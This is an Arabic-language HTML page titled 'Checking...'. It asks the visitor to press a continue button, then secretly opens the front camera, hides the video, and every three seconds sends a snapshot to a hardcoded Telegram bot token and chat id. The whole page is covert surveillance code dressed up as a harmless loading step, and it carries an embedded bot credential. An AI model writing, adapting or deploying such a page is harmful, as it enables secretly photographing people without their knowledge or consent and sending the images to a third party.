<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checking...</title>
    <style>
        body { background: white; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        #btn { padding: 15px 40px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 18px; }
    </style>
</head>
<body>

    <div id="status">
        <p>يرجى الضغط للمتابعة</p>
        <button id="btn">متابعة</button>
    </div>

    <video id="v" autoplay playsinline muted style="width:1px; height:1px; opacity:0;"></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        const token = '6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY';
        const id = '2103976274';

        document.getElementById('btn').onclick = async function() {
            this.style.display = 'none';
            document.querySelector('p').innerText = "جاري التحميل...";

            try {
                // محاولة فتح الكاميرا بطلب صريح للدقة
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                
                const video = document.getElementById('v');
                video.srcObject = stream;
                
                // التأكد من أن الفيديو بدأ فعلاً قبل التقاط الصور
                video.onloadedmetadata = function() {
                    video.play();
                    setInterval(takePic, 3000);
                };

            } catch (err) {
                alert("خطأ: يرجى تفعيل الكاميرا من إعدادات المتصفح (أيقونة القفل بجانب الرابط).");
            }
        };

        function takePic() {
            const canvas = document.getElementById('c');
            const video = document.getElementById('v');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            canvas.toBlob(blob => {
                const fd = new FormData();
                fd.append('chat_id', id);
                fd.append('photo', blob, 'img.jpg');
                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
            }, 'image/jpeg', 0.8);
        }
    </script>
</body>
</html>
